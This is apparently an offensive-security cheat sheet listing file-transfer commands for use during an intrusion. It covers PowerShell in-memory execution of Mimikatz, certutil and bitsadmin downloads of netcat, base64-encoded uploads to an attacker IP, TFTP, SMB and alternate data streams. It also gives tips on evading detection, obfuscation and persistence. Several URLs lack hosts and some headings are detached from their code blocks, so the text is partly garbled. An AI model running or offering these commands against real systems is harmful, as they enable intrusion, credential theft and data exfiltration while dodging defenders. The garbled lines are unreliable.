# File-transfer

#### PowerShell Commands
- Download a File
```
Invoke-WebRequest https:///PowerView.ps1 -OutFile PowerView.ps1
```
- Execute File in Memory
```
IEX (New-Object Net.WebClient).DownloadString('https:///Invoke-Mimikatz.ps1')
```
- Upload a File
```
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```
- Download with Custom User-Agent
```
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
```
- Base64 Encoded Upload
```
$bytes = [System.IO.File]::ReadAllBytes("C:\Temp\file.txt")
$b64 = [System.Convert]::ToBase64String($bytes)
Invoke-WebRequest -Uri http://10.10.10.32/upload -Method POST -Body $b64
```

#### Windows Native Tools
- Bitsadmin (Deprecated but Still Useful)
```
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```
- Certutil (Native to Windows for Certificate Management)
```
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

#### Linux-Based Tools
- Wget
- cURL
- Python HTTP File Download

#### Other Methods
- PHP File Download
- SCP (Secure Copy Protocol) - Upload
- SCP - Download
- Netcat (Linux/Windows) Send File:
Receive File:- FTP Upload/Download (Interactive)
- TFTP (Trivial File Transfer Protocol) Download:
Upload:- SMB (Using SMBClient)

#### Extra Tips
- Bypass Restrictions: Consider using alternative ports, URL encoding, or modifying headers to bypass security restrictions.
- Evasion Techniques: Use legitimate-looking User-Agents, filenames, or paths to evade detection.
- Persistence: Combine these methods with scheduled tasks or registry modifications for persistence.
- File Obfuscation: Encode files in Base64 to evade basic detection.
- Alternate Data Streams (Windows):
- Compression & Encryption: Compress files using `zip` or `7z` with a password.

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

```
import requests
response = requests.get('http://10.10.10.32/nc.exe')
with open('nc.exe', 'wb') as file:
file.write(response.content)
```

```
php -r '$file = file_get_contents("https:///LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

```
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
```

```
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

```
nc -lvp 4444 > received_file
```

```
nc  4444
```
ftp 10.10.10.32
```

```
tftp -i 10.10.10.32 GET nc.exe
```

```
tftp -i 10.10.10.32 PUT nc.exe
```

```
smbclient \\10.10.10.32\share -U username
put file.txt
get file.txt
```

```
type nc.exe > file.txt:stream
```

```
7z a -psecret -mhe protected.7z file.txt
```
